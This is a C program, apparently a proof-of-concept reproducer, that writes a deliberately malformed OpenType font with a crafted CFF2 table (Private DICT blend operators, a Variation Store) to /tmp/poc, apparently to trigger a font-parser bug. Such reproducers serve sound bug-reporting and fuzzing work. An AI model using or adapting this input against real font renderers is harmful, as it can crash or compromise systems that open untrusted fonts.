#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header: sfVersion = 'OTTO', numTables = 1 */
    fputc(0x4F, f); fputc(0x54, f); fputc(0x54, f); fputc(0x4F, f);
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0x00, f); /* numTables = 1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* searchRange, entrySelector, rangeShift */

    /* Table record: tag = 'CFF2' */
    fputc(0x43, f); fputc(0x46, f); fputc(0x46, f); fputc(0x32, f); /* 'CFF2' */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* checksum placeholder */

    long offset_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* offset placeholder */
    long length_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* length placeholder */

    /* CFF data starts here */
    long cff_start = ftell(f);

    /* CFF2 Header: 5 bytes total */
    fputc(0x02, f); /* major version 2 */
    fputc(0x00, f); /* minor version 0 */
    fputc(0x05, f); /* hdrSize = 5 */
    long topdict_len_pos = ftell(f);
    fputc(0x00, f); fputc(0x00, f); /* placeholder for topDictLength */

    /* Top DICT data */
    long topdict_data_start = ftell(f);
    /* Private size 20 */
    fputc(0x9F, f);
    /* Private offset (single byte placeholder) */
    long private_offset_pos = ftell(f);
    fputc(0x00, f);
    /* Private operator */
    fputc(0x12, f);
    /* CharStrings offset (single byte placeholder) */
    long charstrings_offset_pos = ftell(f);
    fputc(0x00, f);
    /* CharStrings operator */
    fputc(0x11, f);
    /* vstore offset (single byte placeholder) */
    long vstore_offset_pos = ftell(f);
    fputc(0x00, f);
    /* vstore operator (0x18) */
    fputc(0x18, f);

    long topdict_data_end = ftell(f);
    long topdict_data_length = topdict_data_end - topdict_data_start;

    /* Patch topDictLength */
    fseek(f, topdict_len_pos, SEEK_SET);
    fputc((topdict_data_length >> 8) & 0xFF, f);
    fputc(topdict_data_length & 0xFF, f);

    /* Global Subrs INDEX: empty (4-byte count) */
    fseek(f, topdict_data_end, SEEK_SET);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Private DICT starts here */
    long private_start = ftell(f);

    /* Private DICT: vsindex (0x16), then two blends (0x17) with 3 operands each */
    fputc(0x8B, f); /* push 0 */
    fputc(0x16, f); /* vsindex operator (opcode 22) */
    /* First blend: push 0, push 1, push 2 (3 operands for numBlends=1) */
    fputc(0x8B, f); fputc(0x8C, f); fputc(0x8D, f); fputc(0x17, f);
    /* Second blend: push 0, push 1, push 2 (3 operands) */
    fputc(0x8B, f); fputc(0x8C, f); fputc(0x8D, f); fputc(0x17, f);

    /* Pad to exactly 20 bytes with zeros */
    long private_end = ftell(f);
    long private_size = private_end - private_start;
    for (long i = private_size; i < 20; i++) {
        fputc(0x00, f);
    }

    /* CharStrings INDEX: empty (4-byte count) */
    long charstrings_start = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);

    /* Variation Store INDEX: count=1 (4 bytes), off_size=1 */
    long vstore_start = ftell(f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f); /* count = 1 */
    fputc(0x01, f); /* off_size = 1 */
    fputc(0x01, f); /* offset[0] = 1 */
    fputc(0x1D, f); /* offset[1] = 29 (28 bytes of VarStore data + 1) */

    /* VarStore data: 28 bytes */
    fputc(0x01, f); /* Format = 1 */
    /* RegionList: axisCount = 1, regionCount = 1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    /* Region: axis = 0, start = 0.0, end = 1.0 */
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x00, f); fputc(0x00, f);
    fputc(0x40, f); fputc(0x00, f);
    /* VarData: varDataCount = 1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    /* VarData entry: numAxes = 1, regionIndices[0] = 0 */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x00, f); fputc(0x00, f);
    /* numRows = 1 */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);
    /* Data: 1 row of 1 value = 0.5 */
    fputc(0x20, f); fputc(0x00, f);

    long cff_end = ftell(f);
    long cff_length = cff_end - cff_start;

    /* Compute offsets */
    long private_offset = private_start - cff_start;
    long charstrings_offset = charstrings_start - cff_start;
    long vstore_offset = vstore_start - cff_start;

    /* Patch private offset */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc(private_offset + 139, f);

    /* Patch charstrings offset */
    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(charstrings_offset + 139, f);

    /* Patch vstore offset */
    fseek(f, vstore_offset_pos, SEEK_SET);
    fputc(vstore_offset + 139, f);

    /* Patch table record offset and length */
    fseek(f, offset_pos, SEEK_SET);
    uint32_t cff_offset = (uint32_t)cff_start;
    fputc((cff_offset >> 24) & 0xFF, f);
    fputc((cff_offset >> 16) & 0xFF, f);
    fputc((cff_offset >> 8) & 0xFF, f);
    fputc(cff_offset & 0xFF, f);

    fseek(f, length_pos, SEEK_SET);
    uint32_t cff_length32 = (uint32_t)cff_length;
    fputc((cff_length32 >> 24) & 0xFF, f);
    fputc((cff_length32 >> 16) & 0xFF, f);
    fputc((cff_length32 >> 8) & 0xFF, f);
    fputc(cff_length32 & 0xFF, f);

    fclose(f);
    return 0;
}